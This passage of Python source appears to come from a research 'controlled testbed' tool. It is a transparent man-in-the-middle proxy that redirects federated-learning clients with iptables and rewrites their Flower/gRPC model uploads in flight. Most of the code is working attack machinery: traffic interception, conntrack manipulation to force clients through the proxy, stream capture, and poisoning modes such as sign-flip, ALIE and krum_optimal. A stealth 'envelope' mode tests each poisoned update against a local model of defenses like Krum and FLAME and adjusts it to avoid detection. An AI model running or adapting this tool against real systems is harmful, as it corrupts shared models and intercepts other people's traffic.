            header, frame_type, flags, stream_id, payload = item

            # If the upload rewriter granted synthetic WINDOW_UPDATE credit
            # while withholding DATA, consume equivalent real-server credit
            # here so the client never receives double flow-control allowance.
            if frame_type == 0x8 and len(payload) == 4 and flow_bridge is not None:
                increment = int.from_bytes(payload, "big") & 0x7FFFFFFF
                remaining = flow_bridge.adjust_server_window_update(stream_id, increment)
                if remaining <= 0:
                    continue
                payload = (remaining & 0x7FFFFFFF).to_bytes(4, "big")
                header = build_http2_frame_header(4, 0x8, flags, stream_id)

            frame_bytes = header + payload
            if flow_bridge is not None:
                with flow_bridge.client_send_lock:
                    written, count = send_capture_count(
                        dst, frame_bytes, capture, capture_handle, written, stats, label
                    )
            else:
                written, count = send_capture_count(
                    dst, frame_bytes, capture, capture_handle, written, stats, label
                )
            direction_bytes += count
            direction_chunks += 1

            if frame_type == 0 and stream_id != 0:
                data_payload = payload
                if flags & 0x8:  # PADDED
                    if not payload:
                        continue
                    padding = int(payload[0])
                    if padding > len(payload) - 1:
                        continue
                    data_payload = payload[1 : len(payload) - padding if padding else len(payload)]
                observer = observers.setdefault(
                    stream_id,
                    GrpcDownloadObserver(args, client_ip=client_ip, stream_id=stream_id),
                )
                observer.feed(data_payload)
    except Exception as exc:
        termination_reason = f"exception:{type(exc).__name__}"
        termination_exception = repr(exc)
        logger.warning(
            "[%s] TARGET server->client HTTP/2 relay terminated by %s: %r",
            client_ip,
            type(exc).__name__,
            exc,
        )
    finally:
        for observer in observers.values():
            try:
                observer.close()
            except Exception:
                pass
        if stats:
            stats.mark_closed(label)
        flow_snapshot = flow_bridge.snapshot() if flow_bridge is not None else {}
        logger.info(
            "[%s] TARGET server->client observed relay closed reason=%s exception=%s "
            "bytes=%d chunks=%d captured_bytes=%d cache_entries=%d "
            "synthetic_conn_outstanding=%s synthetic_stream_outstanding=%s "
            "credit_granted=%s credit_suppressed=%s",
            client_ip,
            termination_reason,
            termination_exception,
            direction_bytes,
            direction_chunks,
            written,
            len(get_model_cache(args).entries.get(str(client_ip), [])) if args is not None else 0,
            flow_snapshot.get("synthetic_connection_credit_outstanding", 0),
            flow_snapshot.get("synthetic_stream_credit_outstanding", {}),
            flow_snapshot.get("flow_control_synthetic_credit_bytes", 0),
            flow_snapshot.get("flow_control_server_credit_suppressed_bytes", 0),
        )


def handle_pickle_connection(
    client_sock: socket.socket,
    server_sock: socket.socket,
    client_ip: str,
    proxy_state: ProxyState,
    args: argparse.Namespace,
    first_len_data: bytes,
    first_msg_len: int,
) -> None:
    def forward_upload(initial_len_data: bytes = first_len_data, initial_msg_len: int = first_msg_len):
        try:
            pending = (initial_len_data, initial_msg_len)
            while True:
                if pending:
                    _len_data, msg_len = pending
                    pending = None
                else:
                    len_data = recv_exact(client_sock, 4)
                    if not len_data:
                        break
                    msg_len = struct.unpack("!I", len_data)[0]
                    if msg_len <= 0 or msg_len > get_message_policy(args).hard_limit_bytes:
                        logger.warning("[%s] invalid pickle upload length=%d; closing", client_ip, msg_len)
                        break

                msg_data = recv_exact(client_sock, msg_len)
                if not msg_data:
                    break
                modified = proxy_state.process_upload(msg_data, args.attack_after, args.attack_strength, args.attack_type)
                server_sock.sendall(struct.pack("!I", len(modified)))
                server_sock.sendall(modified)
        except Exception as exc:
            logger.debug("[%s] pickle upload ended: %s", client_ip, exc)
        finally:
            try:
                server_sock.shutdown(socket.SHUT_WR)
            except Exception:
                pass

    def forward_download():
        try:
            while True:
                len_data = recv_exact(server_sock, 4)
                if not len_data:
                    break
                msg_len = struct.unpack("!I", len_data)[0]
                if msg_len <= 0 or msg_len > get_message_policy(args).hard_limit_bytes:
                    logger.warning("[%s] invalid pickle download length=%d; closing", client_ip, msg_len)
                    break
                msg_data = recv_exact(server_sock, msg_len)
                if not msg_data:
                    break
                client_sock.sendall(struct.pack("!I", len(msg_data)))
                client_sock.sendall(msg_data)
        except Exception as exc:
            logger.debug("[%s] pickle download ended: %s", client_ip, exc)
        finally:
            try:
                client_sock.shutdown(socket.SHUT_WR)
            except Exception:
                pass

    t_up = threading.Thread(target=forward_upload, daemon=True, name=f"pickle-up-{client_ip}")
    t_dn = threading.Thread(target=forward_download, daemon=True, name=f"pickle-down-{client_ip}")
    t_up.start(); t_dn.start()
    t_up.join(); t_dn.join()


def handle_client(
    client_sock: socket.socket,
    client_addr,
    learner: ServerLearner,
    proxy_state: ProxyState,
    limiter: ConnectionLimiter,
    capture: StreamCapture,
    args: argparse.Namespace,
) -> None:
    client_ip, client_port = client_addr[0], int(client_addr[1])
    logger.info("[%s] TCP connection reached proxy listener from source port %s",
                client_ip, client_port)
    allowed, allow_reason = client_allowed(client_ip, args)
    if not allowed:
        logger.warning("[%s] connection rejected before upstream connect: %s", client_ip, allow_reason)
        close_quietly(client_sock)
        return

    if not limiter.acquire(client_ip):
        logger.warning("[%s] connection rejected: max active connections reached", client_ip)
        close_quietly(client_sock)
        return

    server_sock: Optional[socket.socket] = None
    c2s_file = None
    s2c_file = None
    stats: Optional[ConnectionStats] = None
    stats_stop = threading.Event()
    try:
        logger.info("[%s] Intercepted client connection", client_ip)
        endpoint = learner.wait(args.server_learn_timeout)
        if endpoint is None:
            logger.error("[%s] No target server learned. Pass --target-server-ip or start sniffer metadata first.", client_ip)
            return

        server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect_timeout = float(args.socket_timeout) if float(args.socket_timeout) > 0 else 15.0
        server_sock.settimeout(connect_timeout)
        client_sock.settimeout(None)
        server_sock.connect((endpoint.ip, endpoint.port))
        # Flower uses long lived HTTP/2 connections. Do not close an otherwise
        # healthy client merely because one direction is quiet for 120 seconds.
        server_sock.settimeout(None)
        client_sock.settimeout(None)
        logger.info("[%s] Relaying to real FL server %s:%s source=%s", client_ip, endpoint.ip, endpoint.port, endpoint.source)

        stats = ConnectionStats(client_ip=client_ip, client_port=client_port, server_ip=endpoint.ip, server_port=endpoint.port)
        dashboard_state = _get_dashboard_state()
        if dashboard_state is not None:
            dashboard_state.register_connection(
                stats,
                target=client_should_be_poisoned(client_ip, args),
            )
        if args.log_interval > 0:
            start_periodic_stats_logger(stats, args.log_interval, stats_stop)
        c2s_file, s2c_file = capture.open_pair(client_ip, client_port)

        max_message_bytes = get_message_policy(args).hard_limit_bytes
        mode, first4, first_len = read_first_len_or_raw(client_sock, max_message_bytes)
        if mode == "closed":
            return

        protocol = args.protocol
        if protocol == "auto":
            protocol = mode
        elif protocol == "pickle" and mode == "raw":
            logger.warning("[%s] expected pickle length prefix but first length=%d. This looks like Flower/gRPC HTTP2; closing.", client_ip, first_len)
            return
        elif protocol == "raw":
            mode = "raw"

        dashboard_state = _get_dashboard_state()
        if dashboard_state is not None and stats is not None:
            dashboard_state.set_connection_protocol(stats, protocol)

        if protocol == "raw":
            is_http2 = first4.startswith(b"PRI ")
            connection_targeted = bool(client_should_be_poisoned(client_ip, args))

            # V27.1 transport isolation:
            #   * target connections may use the gRPC rewriter and balanced
            #     synthetic HTTP/2 credit because DATA is intentionally withheld;
            #   * non-target connections never enter the rewriter or credit bridge.
            #     Their frames are forwarded first and observed asynchronously.
            flow_bridge = (
                FlowControlBridge()
                if args.live_poison
                and is_http2
                and connection_targeted
                and bool(getattr(args, "adaptive_flow_control", True))
                else None
            )

            if args.live_poison and is_http2:
                if np is None:
                    logger.error("[%s] --live-poison requires numpy. Install numpy or run without --live-poison.", client_ip)
                    return

                if connection_targeted:
                    logger.warning(
                        "[%s] TARGET HTTP/2 connection: update-space rewriter enabled; "
                        "synthetic flow credit=%s",
                        client_ip,
                        bool(flow_bridge is not None),
                    )
                    t_up = threading.Thread(
                        target=relay_http2_poison_client_to_server,
                        args=(client_sock, server_sock, client_ip, first4, capture, c2s_file, stats, args, flow_bridge),
                        daemon=True,
                        name=f"h2poison-up-{client_ip}",
                    )
                    t_dn = threading.Thread(
                        target=relay_http2_observe_server_to_client,
                        args=(server_sock, client_sock, client_ip, capture, s2c_file, stats, args, flow_bridge),
                        daemon=True,
                        name=f"h2observe-down-{client_ip}",
                    )
                else:
                    logger.info(
                        "[%s] NON-TARGET HTTP/2 connection: transparent bidirectional relay; "
                        "no rewriter, no synthetic WINDOW_UPDATE, no server-credit suppression; "
                        "peer/model observation runs asynchronously",
                        client_ip,
                    )
                    t_up = threading.Thread(
                        target=relay_http2_transparent_observe_client_to_server,
                        args=(client_sock, server_sock, client_ip, first4, capture, c2s_file, stats, args),
                        daemon=True,
                        name=f"h2transparent-up-{client_ip}",
                    )
                    t_dn = threading.Thread(
                        target=relay_http2_transparent_observe_server_to_client,
                        args=(server_sock, client_sock, client_ip, capture, s2c_file, stats, args),
                        daemon=True,
                        name=f"h2transparent-down-{client_ip}",
                    )
            else:
                if is_http2:
                    logger.warning("[%s] Flower/gRPC HTTP2 detected. RAW transparent relay active; payload poison disabled. Use --live-poison to rewrite length-preserving NumPy tensor payloads.", client_ip)
                else:
                    logger.info("[%s] RAW transparent relay active; payload poison disabled.", client_ip)
                t_up = threading.Thread(
                    target=relay_stream,
                    args=(client_sock, server_sock, client_ip, "client->server", first4, capture, c2s_file, stats),
                    daemon=True,
                    name=f"raw-up-{client_ip}",
                )
                t_dn = threading.Thread(
                    target=relay_stream,
                    args=(server_sock, client_sock, client_ip, "server->client", b"", capture, s2c_file, stats),
                    daemon=True,
                    name=f"raw-down-{client_ip}",
                )
            t_up.start(); t_dn.start()
            t_up.join(); t_dn.join()
            if stats:
                stats.log_summary("final")
                proto_name = "h2-phase-gated-update-space" if args.live_poison and first4.startswith(b"PRI ") else "raw"
                capture.write_metadata(client_ip, client_port, endpoint.ip, endpoint.port, proto_name, stats)
            return

        logger.info("[%s] PICKLE protocol detected. Payload substitution enabled for controlled custom protocol.", client_ip)
        handle_pickle_connection(client_sock, server_sock, client_ip, proxy_state, args, first4, first_len)

    except Exception as exc:
        logger.error("[%s] connection handler error: %s", client_ip, exc)
    finally:
        stats_stop.set()
        close_quietly(client_sock)
        close_quietly(server_sock)
        capture.close(c2s_file)
        capture.close(s2c_file)
        limiter.release(client_ip)
        dashboard_state = _get_dashboard_state()
        if dashboard_state is not None:
            dashboard_state.close_connection(stats)
        logger.info("[%s] connection closed", client_ip)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Transparent FL TCP interceptor/relay for controlled testbed")
    parser.add_argument("--interface", default="wlo1", help="Hotspot/router interface receiving client traffic")
    parser.add_argument("--listen-host", default="0.0.0.0", help="Local listen host. Use 0.0.0.0 for iptables REDIRECT.")
    parser.add_argument("--proxy-port", type=int, default=9090, help="Local transparent proxy listen port")

    parser.add_argument("--target-server-ip", "--server-ip", dest="target_server_ip", default="", help="Real FL server IP, e.g. 10.42.0.195")
    parser.add_argument("--target-server-port", "--port", dest="target_server_port", type=int, default=8080, help="Real FL server port")
    parser.add_argument("--client-subnet", default="", help="Client subnet to redirect/filter, e.g. 10.42.0.0/24. If omitted, inferred from interface /24.")
    parser.add_argument("--allowed-clients", default="", help="Comma-separated exact client IPs to accept after redirect; optional")
    parser.add_argument("--blocked-clients", default="", help="Comma-separated client IPs to reject; optional")

    parser.add_argument("--server-learn-host", default="127.0.0.1", help="UDP host for sniffer/analyzer server metadata")
    parser.add_argument("--server-learn-port", type=int, default=7007, help="UDP port for sniffer/analyzer server metadata")
    parser.add_argument("--server-learn-timeout", type=float, default=60.0)
    parser.add_argument("--allow-server-update", action="store_true")

    parser.add_argument("--install-iptables", action=argparse.BooleanOptionalAction, default=True, help="Install/remove transparent REDIRECT rule")
    parser.add_argument("--cleanup-interfaces", default="", help="Comma-separated interfaces for optional tc cleanup; default includes --interface")
    parser.add_argument("--cleanup-tc", action=argparse.BooleanOptionalAction, default=True, help="Remove tc qdisc on shutdown")
    parser.add_argument("--cleanup-mangle", action=argparse.BooleanOptionalAction, default=True, help="Flush iptables mangle table on shutdown")
    parser.add_argument("--flush-conntrack", action=argparse.BooleanOptionalAction, default=False, help="Flush the entire conntrack table on shutdown; disabled by default because it affects unrelated traffic")
    parser.add_argument("--repair-preexisting-flows", action=argparse.BooleanOptionalAction, default=True, help="Delete only pre-existing direct FL conntrack entries after installing REDIRECT so clients reconnect through the proxy")
    parser.add_argument("--abort-on-preexisting-flows", action=argparse.BooleanOptionalAction, default=True, help="Abort startup if any direct FL flow remains after repair")

    parser.add_argument("--protocol", choices=["auto", "raw", "pickle"], default="auto", help="auto detects raw Flower/gRPC vs length-prefixed pickle")
    parser.add_argument("--max-connections", type=int, default=128)
    parser.add_argument("--max-connections-per-client", type=int, default=32)
    parser.add_argument("--socket-timeout", type=float, default=120.0)
    parser.add_argument(
        "--max-message-mb", type=int, default=0,
        help=(
            "Optional operator soft cap for one declared gRPC/pickle message in MiB; "
            "0 means architecture-adaptive with no model-specific soft cap"
        ),
    )
    parser.add_argument(
        "--hard-max-message-gb", type=float, default=8.0,
        help="Absolute malformed-message safety ceiling, independent of model architecture",
    )
    parser.add_argument(
        "--spool-threshold-mb", type=int, default=32,
        help="Messages larger than this are buffered in a temporary disk spool instead of RAM",
    )
    parser.add_argument(
        "--spool-dir", default=".proxy_spool",
        help="Temporary large-message spool directory",
    )
    parser.add_argument(
        "--spool-disk-reserve-mb", type=int, default=1024,
        help="Minimum free-disk reserve preserved before accepting a large message spool",
    )
    parser.add_argument(
        "--adaptive-flow-control", action=argparse.BooleanOptionalAction, default=True,
        help="Grant balanced synthetic HTTP/2 credit while large upload DATA is withheld for rewriting",
    )

    parser.add_argument("--capture-streams", action=argparse.BooleanOptionalAction, default=True, help="Capture intercepted byte streams to files; enabled by default. Use --no-capture-streams to disable.")
    parser.add_argument("--capture-dir", default="captures", help="Directory for captured stream files")
    parser.add_argument("--capture-max-bytes", type=int, default=0, help="Max bytes per direction per connection; 0 = unlimited")
    parser.add_argument("--log-interval", type=float, default=5.0, help="Seconds between live per-connection byte logs; 0 disables live logs")

    parser.add_argument("--dashboard", action=argparse.BooleanOptionalAction, default=True, help="Start the read-only attacker dashboard automatically")
    parser.add_argument("--dashboard-host", default="127.0.0.1", help="Dashboard bind host; localhost is the safe default")
    parser.add_argument("--dashboard-port", type=int, default=8765, help="Preferred dashboard port; the next free port is chosen automatically")
    parser.add_argument("--experiment-id", default="", help="Optional experiment ID matching the server manifest; used only in proxy event logs")
    parser.add_argument("--run-id", default="", help="Optional run ID matching the server manifest; used only in proxy event logs")
    parser.add_argument("--condition", default="", help="Optional opaque condition label; used only in proxy event logs")
    parser.add_argument("--proxy-run-id", default="", help="Optional proxy run ID; generated automatically when blank")
    parser.add_argument("--attack-event-log", default="", help="Structured per-message proxy ground-truth CSV; blank creates a timestamped file")
    parser.add_argument("--proxy-run-manifest", default="", help="JSON manifest recording the complete proxy configuration, code hashes, clock status, and envelope state fingerprints")
    parser.add_argument("--proxy-resource-log", default="", help="Periodic proxy CPU/RAM/GPU/power CSV; blank creates a timestamped file")
    parser.add_argument("--resource-log-interval-s", type=float, default=1.0, help="Seconds between proxy resource samples")


    parser.add_argument("--phase-gate-enabled", action=argparse.BooleanOptionalAction, default=True, help="Require a fresh confident MODEL_UPLOAD prediction before any modification")
    parser.add_argument("--phase-gate-min-confidence", type=float, default=0.85, help="Minimum MODEL_UPLOAD posterior required to open the attack gate")
    parser.add_argument("--phase-gate-max-age-s", type=float, default=90.0, help="Maximum age of the phase prediction used by the attack gate (only enforced when --no-phase-gate-ignore-age). Raised from 15s: peer clients (which trigger far less often than the attacked client) showed real inter-trigger gaps up to ~68s in practice, so 15s discarded valid-but-infrequent confirmations.")
    parser.add_argument("--phase-gate-ignore-age", action=argparse.BooleanOptionalAction, default=False, help="Treat phase-prediction age as advisory only. Disabled by default so analyzer apply_poison TTL/freshness closes the gate when stale.")
    parser.add_argument("--phase-gate-require-client", action=argparse.BooleanOptionalAction, default=True, help="Require phase metadata specifically associated with the intercepted client")
    parser.add_argument("--phase-gate-reject-sources", default="server_announce", help="CSV of metadata sources that cannot open the attack gate")
    parser.add_argument("--require-update-space", action=argparse.BooleanOptionalAction, default=True, help="Require a matched downloaded global model; never fall back silently to full-weight poisoning")
    parser.add_argument("--global-model-max-age-s", type=float, default=600.0, help="Maximum age of a cached global model eligible for upload matching")
    parser.add_argument("--require-global-round-match", action=argparse.BooleanOptionalAction, default=False, help="Require cached global-model round to exactly equal the upload phase round")
    parser.add_argument("--download-phase-min-confidence", type=float, default=0.70, help="Confidence used to mark cached downloads as phase-qualified")
    parser.add_argument("--model-cache-entries-per-client", type=int, default=12, help="Maximum cached global-model candidates per client")
    parser.add_argument(
        "--model-cache-memory-mb", type=int, default=128,
        help="Keep cached global models at or below this size in RAM; larger contracts use mmap-backed disk storage",
    )
    parser.add_argument(
        "--model-cache-dir", default=".proxy_model_cache",
        help="Deduplicated architecture-neutral global-model cache directory",
    )
    parser.add_argument(
        "--model-cache-disk-gb", type=float, default=20.0,
        help="Maximum deduplicated on-disk global-model cache budget",
    )
    parser.add_argument("--model-min-float-arrays", type=int, default=2, help="Minimum floating tensors required to treat a gRPC message as a model")
    parser.add_argument("--model-min-elements", type=int, default=1000, help="Minimum total floating coordinates required to treat a gRPC message as a model")
    parser.add_argument("--update-sparsity-epsilon", type=float, default=1e-8, help="Absolute threshold used for near-zero update sparsity")

    parser.add_argument("--live-poison", action="store_true", help="Enable live length-preserving NumPy poisoning for plaintext Flower/gRPC HTTP/2 client-to-server DATA messages")
    parser.add_argument("--live-attack", choices=["sign_flip", "scale", "noise", "zero", "clip", "envelope"], default="sign_flip", help="Live NPY payload attack type ('envelope' = block-level stealth projection)")
    parser.add_argument("--live-alpha", type=float, default=3.0, help="Live attack strength for sign_flip/scale")
    parser.add_argument("--live-clip-ratio", type=float, default=0.3, help="For --live-attack clip: norm ratio applied after sign-flipping the update; 0.3 gives cosine -1 and 30%% of the genuine update norm")
    parser.add_argument("--live-sigma", type=float, default=0.01, help="Live noise standard deviation")
    parser.add_argument("--live-seed", type=int, default=1234, help="Random seed for live noise attack")
    parser.add_argument("--live-start-message", type=int, default=0, help="First client-to-server gRPC message index to poison")
    parser.add_argument("--live-end-message", type=int, default=-1, help="Last client-to-server gRPC message index to poison; -1 means no upper limit")
    parser.add_argument("--live-max-arrays-per-message", type=int, default=0, help="Maximum arrays to poison per gRPC message; 0 means no limit")
    parser.add_argument("--live-include-nonfloat", action="store_true", help="Also modify non-floating NumPy arrays; default skips them")
    parser.add_argument("--live-log-every", type=int, default=50, help="Log every N modified gRPC messages; 0 disables periodic modification logs")
    # Envelope (stealth) attack-mode parameters — used only when --live-attack envelope
    parser.add_argument("--live-warmup", type=int, default=20, help="[envelope] benign blocks to observe before poisoning begins")
    parser.add_argument("--live-warmup-rounds", type=int, default=3, help="Initial FL rounds to relay unchanged before poisoning; applies to all live attack types when analyzer round/round_id is available")
    parser.add_argument("--live-aggressiveness", type=float, default=0.5, help="[envelope] 0=fully benign (max stealth), 1=raw poison (no stealth). Sweep this to trace the frontier.")
    parser.add_argument("--live-raw-attack", choices=["sign_flip", "scale", "noise", "ALIE", "min_max", "min_sum", "IPM", "krum_optimal"], default="sign_flip", help="[envelope] poison technique. Own-only: sign_flip/scale/noise (projected into the benign envelope). Peer-based (need peer visibility, crafted at the defense boundary): ALIE, min_max, min_sum, IPM, krum_optimal. krum_optimal requires a Krum or Multi-Krum server")
    parser.add_argument("--live-k-coord", type=float, default=3.0, help="[envelope] sigma multiplier for per-coordinate benign band")
    parser.add_argument("--live-k-norm", type=float, default=3.0, help="[envelope] sigma multiplier for per-tensor norm band")
    parser.add_argument("--live-window", type=int, default=5, help="[envelope] sliding-window size in rounds (0=global; 5 calibrated best on real captures)")
    # Peer fingerprinting, temporal ramp, oracle self-audit, and selection-attack knobs.
    parser.add_argument("--live-ramp-rounds", type=int, default=5, help="[envelope] rounds to ramp stealth in after warmup so a client's self-cosine trace has no step discontinuity; 0 disables ramping")
    parser.add_argument("--live-adaptive-stealth", action=argparse.BooleanOptionalAction, default=True, help="[envelope] run the local defense oracle each round and back off toward the benign envelope if the poisoned upload would be flagged")
    parser.add_argument("--live-backoff-step", type=float, default=0.1, help="[envelope] aggressiveness decrement per oracle back-off iteration")
    parser.add_argument("--live-min-peers", type=int, default=2, help="[envelope] minimum distinct peer clients required before a peer envelope is used instead of the self-envelope")
    parser.add_argument("--live-peer-min-obs", type=int, default=3, help="[envelope] minimum peer observations required for a ready peer envelope")
    parser.add_argument("--live-derived-f", type=int, default=1, help="[envelope] Byzantine bound f the attacker assumes; MUST match the server's per-round derived_f for krum_optimal to target the correct selection boundary")
    parser.add_argument("--live-multi-krum-m", type=int, default=1, help="[envelope] Multi-Krum selection size m the server uses; 1 = plain Krum")
    parser.add_argument("--live-trimmed-beta", type=float, default=0.1, help="[envelope] trimmed-mean beta used by the local oracle")
    parser.add_argument("--live-flame-cosine-threshold", type=float, default=0.1, help="[envelope] FLAME cosine-distance threshold used by the local surrogate oracle")
    parser.add_argument("--live-active-defense", choices=["fedavg", "krum", "multi_krum", "median", "trimmed_mean", "bulyan", "flame", "auto"], default="flame", help="[envelope] server defense the local oracle should evaluate; use auto only for small models because it evaluates all defenses")
    parser.add_argument("--live-geometry-sketch-dim", type=int, default=8192, help="[envelope] deterministic coordinate-sketch size for peer/oracle geometry")
    parser.add_argument("--live-peer-memory-mb", type=int, default=512, help="[envelope] process-wide memory budget for stored full peer updates")
    parser.add_argument("--live-peer-full-block-max-mb", type=int, default=16, help="[envelope] peer updates larger than this are stored as geometry sketches only; 16 MiB keeps ResNet/transformer peers scalable")
    parser.add_argument("--live-state-save-every", type=int, default=0, help="[envelope] persist full envelope history every N observed target updates; 0 disables periodic full-history writes")
    parser.add_argument("--live-large-model-float32-threshold-elements", type=int, default=2000000, help="[envelope] use float32 working buffers for dense global geometry at or above this many coordinates")
    parser.add_argument("--live-engine-cache-dir", default=".stealth_engine_cache", help="[envelope] per-run disk-backed target-history cache for large model updates")
    parser.add_argument("--live-engine-disk-threshold-mb", type=float, default=256.0, help="[envelope] spill target history to mmap-backed disk only when one update exceeds this size; ResNet-18 stays in RAM by default")
    parser.add_argument("--live-large-model-adaptive-backoff-steps", type=int, default=0, help="[envelope] full re-projection backoff attempts for large models; 0 keeps the oracle advisory and avoids repeated costly ResNet/transformer projections")
    parser.add_argument("--non-target-observation-queue-frames", type=int, default=1024, help="Bounded async observation queue for non-target HTTP/2 DATA frames. Queue overflow disables observation but never delays transparent forwarding.")
    parser.add_argument("--poison-clients", default="", help="CSV of client IPs to attack. Use multiple comma-separated IPs for multi-client poisoning, or ALL/* to poison every intercepted client. Blank means no client is attacked; analyzer messages are phase/status only.")
    parser.add_argument("--poison-target-mode", choices=["static", "all"], default="static", help="Target-selection mode. static uses --poison-clients / interactive CSV as the attack target list; all poisons every intercepted client. Analyzer messages are phase/status signals only, not target-selection commands.")
    parser.add_argument("--live-envelope-state", default="", help="[envelope] optional state path; V27 keys state by client and model contract")
    parser.add_argument("--reset-envelope-state", action=argparse.BooleanOptionalAction, default=True, help="[envelope] delete an existing state file at startup so warm-up always begins fresh; use --no-reset-envelope-state only for an intentional resume")

    parser.add_argument("--attack-after", type=int, default=2, help="Pickle protocol only")
    parser.add_argument("--attack-strength", type=float, default=3.0, help="Pickle protocol only")
    parser.add_argument("--attack-type", choices=["scaling", "reversal"], default="reversal", help="Pickle protocol only")
    parser.add_argument("--verbose", "-v", action="store_true")
    return parser.parse_args()


class TransparentProxyApp:
    def __init__(self, args: argparse.Namespace):
        self.args = args
        self.stop_event = threading.Event()
        self.listen_sock: Optional[socket.socket] = None
        self.cleaner = CleanupManager(args)
        self.learner = ServerLearner(args.target_server_ip, args.target_server_port, allow_update=args.allow_server_update)
        self.proxy_state = ProxyState()
        self.limiter = ConnectionLimiter(args.max_connections, args.max_connections_per_client)
        self.capture = StreamCapture(args.capture_streams, args.capture_dir, args.capture_max_bytes)
        self.dashboard_state = AttackerDashboardState(args)
        self.dashboard_server = None
        _set_dashboard_state(self.dashboard_state)

        event_path = str(getattr(args, "attack_event_log", "") or "").strip()
        if not event_path:
            event_path = f"proxy_attack_events_{time.strftime('%Y%m%d_%H%M%S')}.csv"
            args.attack_event_log = event_path
        self.attack_event_logger = AttackEventLogger(event_path, args)
        _set_attack_event_logger(self.attack_event_logger)
        logger.info("Structured proxy attack-event log: %s", self.attack_event_logger.path)

    def request_stop(self, reason: str) -> None:
        logger.info("Stop requested: %s", reason)
        self.dashboard_state.set_status("stopping", reason)
        self.stop_event.set()
        close_quietly(self.listen_sock)

    def start(self) -> None:
        args = self.args
        if args.verbose:
            logging.getLogger().setLevel(logging.DEBUG)

        self.dashboard_state.set_status("starting")
        self.dashboard_server = start_attacker_dashboard(
            self.dashboard_state, args, self.stop_event
        )

        iface_ip, iface_cidr = detect_interface_ipv4(args.interface)
        self.dashboard_state.set_network(
            interface=args.interface,
            interface_ip=iface_ip,
            interface_cidr=iface_cidr,
            client_subnet=args.client_subnet,
            proxy_host=args.listen_host,
            proxy_port=args.proxy_port,
        )
        if not args.client_subnet:
            args.client_subnet = cidr_to_network(iface_cidr)
            if not args.client_subnet:
                raise SystemExit("Could not infer --client-subnet from interface. Pass --client-subnet manually, e.g. 10.42.0.0/24")

        if os.geteuid() != 0 and args.install_iptables:
            raise SystemExit("Transparent iptables REDIRECT requires root. Run with sudo.")

        start_server_metadata_listener(args.server_learn_host, args.server_learn_port, self.learner, args.target_server_port, self.stop_event)

        # Need a target to install the redirect. Prefer explicit target-server-ip. If omitted, wait for sniffer/analyzer metadata.
        self.dashboard_state.set_status("waiting_for_server_metadata")
        endpoint = self.learner.wait(args.server_learn_timeout) if not args.target_server_ip else self.learner.get()
        self.dashboard_state.set_endpoint(endpoint)
        if endpoint is None:
            raise SystemExit("No target server endpoint available. Pass --target-server-ip 10.42.0.195 or start sniffer/analyzer metadata first.")

        if args.install_iptables:
            self.cleaner.install_transparent_redirect(endpoint.ip, endpoint.port)

        existing_direct = audit_existing_direct_fl_connections(endpoint.ip, endpoint.port)
        if existing_direct:
            logger.warning(
                "Detected %d FL conntrack session(s) created before the redirect. "
                "Those established sessions would bypass this proxy.",
                len(existing_direct),
            )
            self.dashboard_state.set_preexisting_flows(existing_direct)
            for row in existing_direct[:20]:
                logger.warning("[PREEXISTING-FL-FLOW] %s", row)

            if bool(getattr(args, "repair_preexisting_flows", True)):
                removed, remaining = delete_existing_direct_fl_connections(
                    endpoint.ip, endpoint.port
                )
                logger.warning(
                    "Scoped FL conntrack repair removed %d entr%s. "
                    "Affected clients must reconnect through the proxy.",
                    removed,
                    "y" if removed == 1 else "ies",
                )
                self.dashboard_state.set_preexisting_flows(remaining)
                existing_direct = remaining

            if existing_direct and bool(getattr(args, "abort_on_preexisting_flows", True)):
                raise SystemExit(
                    "Pre-existing direct FL flows remain after REDIRECT installation. "
                    "The run was aborted to prevent mixed proxy/bypass routing. "
                    "Stop/restart the listed clients, then start the proxy before "
                    "starting the FL experiment."
                )
            if existing_direct:
                logger.warning(
                    "Continuing with %d unresolved direct FL flow(s); this run must "
                    "not be treated as a controlled all-clients-through-proxy run.",
                    len(existing_direct),
                )

        print("\n" + "=" * 82)
        print("TRANSPARENT FL TCP INTERCEPTOR / RAW RELAY")
        print("=" * 82)
        print(f"Hotspot/router interface: {args.interface} ({iface_ip}, {iface_cidr})")
        print(f"Client subnet redirected: {args.client_subnet}")
        print(f"Real FL server target:    {endpoint.ip}:{endpoint.port} source={endpoint.source}")
        print(f"Local interceptor:        {args.listen_host}:{args.proxy_port}")
        print(f"Protocol mode:            {args.protocol}")
        print(f"iptables redirect:        {'enabled' if args.install_iptables else 'disabled'}")
        print(f"Capture streams:          {'enabled -> ' + args.capture_dir if args.capture_streams else 'disabled'}")
        print(f"Live byte log interval:   {args.log_interval}s")
        print("Clients can keep using the real FL server address; matching traffic is redirected here.")
        print("Flower/gRPC can be relayed in raw mode or rewritten with length-preserving NumPy tensor poisoning when --live-poison is enabled.")
        print("=" * 82 + "\n")

        self.listen_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listen_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.listen_sock.bind((args.listen_host, args.proxy_port))
        self.listen_sock.listen(args.max_connections)
        self.listen_sock.settimeout(0.5)
        logger.info("Transparent interceptor listening on %s:%s", args.listen_host, args.proxy_port)
        self.dashboard_state.set_status("running", "intercepting FL traffic")
        if self.dashboard_state.dashboard_url:
            print(f"Attacker dashboard:        {self.dashboard_state.dashboard_url}", flush=True)

        try:
            while not self.stop_event.is_set():
                try:
                    client_sock, client_addr = self.listen_sock.accept()
                except socket.timeout:
                    continue
                except OSError:
                    break
                thread = threading.Thread(
                    target=handle_client,
                    args=(client_sock, client_addr, self.learner, self.proxy_state, self.limiter, self.capture, args),
                    daemon=True,
                    name=f"client-{client_addr[0]}-{client_addr[1]}",
                )
                thread.start()
        finally:
            self.dashboard_state.set_status("stopped")
            summary_path = self.dashboard_state.write_final_summary()
            if summary_path is not None:
                logger.info("[DASHBOARD] final attacker summary=%s", summary_path)
            close_quietly(self.listen_sock)
            self.cleaner.cleanup("main_exit")


def _detect_interface_auto() -> str:
    """Quick interface auto-detection for the wizard."""
    try:
        result = run_cmd(["ip", "-o", "-4", "addr", "show"], quiet=True)
        for line in result.stdout.splitlines():
            parts = line.split()
            if len(parts) < 4:
                continue
            iface = parts[1].rstrip(":")
            if iface == "lo":
                continue
            link = run_cmd(["ip", "link", "show", iface], quiet=True)
            if "UP" not in link.stdout:
                continue
            if any(iface.startswith(p) for p in ("wlo", "wlan", "ap", "wifi", "wlp")):
                return iface
        # fallback: first non-loopback UP interface
        for line in result.stdout.splitlines():
            parts = line.split()
            if len(parts) < 4:
                continue
            iface = parts[1].rstrip(":")
            if iface != "lo":
                return iface
